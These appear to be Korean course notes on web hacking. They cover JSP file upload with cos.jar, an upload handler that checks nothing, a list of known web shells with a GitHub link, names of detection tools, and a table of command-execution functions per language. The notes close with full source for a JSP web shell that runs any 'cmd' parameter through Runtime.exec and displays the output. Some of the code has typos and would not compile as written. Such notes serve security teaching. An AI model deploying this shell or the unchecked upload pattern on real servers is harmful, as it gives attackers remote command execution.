JAVA - 파일 업로드 X 
=> 라이브러리 => 업로드 O 

2가지
1) cos.jar (O' Reilly) => 간편! / 파일명 핸들링이 어려움
2) commons-fileupload.jar (Apache) => 복잡 / 디테일 작업 

Spring ~ 2.0 => cos.jar => CosMultipartResolver
Spring 2.5 ~ => commons

=> 라이선스 
구글에 cos.jar검색 

apache-tomcat-8.5.53 > webapps > ROOT > index.jsp

<%@ page Language="java" contentType="text/html; charset=UTF-8" %>
<form action="upload.jsp" method="POST" enctype="multipart/form-data">
<input type="file" name="userfile">
<input type="submit" value="UPLOAD">
</form>


<%@ page Language="java" contentType="text/html; charset=UTF-8" %>
<%@ page import="com.oreilly.servlet.MultipartRequest" %>
<% 
  String path = request.getRealPath("upload");
  
  MultipartRequest multi = new MultipartRequest(request, path, 1024*10, "UTF-8");
  String filename = path + "\\" + multi.getFilesystemName("userfile");
  String name = multi.getParameter("name");
  out.println(name);
%>

<li>업로드 성공 : <%filename%></li>

####웹쉘 종류 ####

JSP 웹쉘 : JSP File Browser
PHP 웹쉘 : C99shell, r57shell

웹쉘 깃허브 
https://github.com/tennc/webshell
jsp/jsp_File_browser.jsp 웹쉘 

웹쉘 탐지 솔루션 
MetiEye
Anti-webshell
F1 WSFinder
WSS ShellMonitor 통합웹서버보안솔루션 


###언어별 시스템 함수 
언어    시스템 함수 
PHP     passthru, system, '(백 쿼터), execl, popen, escapeshellcmd, eval, shell_exec, assert
JSP     Runtime.getRuntime().exec(""), processBuilder("")
ASP     CreateObject("wscript.shell").exec("cmd/c" & cmd), eval, Execute
ASPX    WinExec(), ShellExecute()

###JSP 웹쉘 제작###
<% page contentType="text/html; charset=UTF-8" %>
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParamenter("cmd");
    Process ps = null;
    BufferedReader br = null;
    String line = "";
    String result = "";
    String now_page = request.getServletPath();
    
    try {
        if(cmd != null) {
            ps = Runtime.getRuntime().exec(cmd);
            // 바이트스트림 > 문자스트림 > 버퍼 저장
            br = new BufferedReader(new InputStreamReader(ps.getInputStream()));
        
            while((line = br.readLine()) != null) {
                result += line + "<br>";
            }
            ps.destroy();
        }
        //out.println(result);
        
    } finally {
        if(br != null) br.close();
    }
%>

<form action="<%=now_page%>" method="POST">
<input type="text" name="cmd">
<input type="submit" value="EXECUTE">
</form>
<hr>
<% if(cmd != null) { %>
<table style="border: 1px solid black; background-color: black">
<tr>
    <td style="color: white; font-size: 12px"><%=result%></td>
</tr>
</table>
<% } %>





























